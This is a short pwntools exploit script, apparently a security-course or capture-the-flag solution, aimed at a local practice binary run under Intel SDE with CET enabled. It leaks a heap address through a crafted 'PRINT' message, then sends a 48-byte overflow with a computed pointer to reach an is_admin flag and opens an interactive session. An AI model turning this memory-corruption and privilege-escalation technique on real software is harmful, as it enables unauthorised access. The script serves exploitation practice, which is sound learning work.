from pwn import *

target = process("./sdekit/sde64 -no-follow-child -cet -cet_output_file /dev/null -- ./bin/ex1", shell=True)

'''
p (int)&msg - (int)&cmd
$9 = 24

# &MSG_HEADER = 0x555555558020
# &DB_HEAD = 0x555555558090
'''
target.recvuntil(b"> ")
payload = b"PRINT\0" + 18 * b"A" + b"\x90"

target.send(payload)

output = target.recvuntil(b">")
print(output)
output = u64(output.split()[0].ljust(8, b"\x00"))
# log.info("DB_HEAD address %s " % hex(output))
addr_db_head = output

# -> appointment 4 la campul id
'''
p (int)&((*DB_HEAD)->next->next->next->next->data.id) - (int)DB_HEAD
$11 = 1120

# payload pt a ajunge la is_admin
# mov    dword ptr [rbp - 4], 0         (asm is_admin)
# rpb = admin + 4
# 16B = cmd, 4B = actions, 4B = padding, 8B = *msg, 8B = *it, 8B = aliniere la multiplu 16 => 48 bytes
'''
is_admin_addr = addr_db_head + 1124
payload2 = b"A" * 48 + p64(is_admin_addr)

target.send(payload2)
target.interactive()
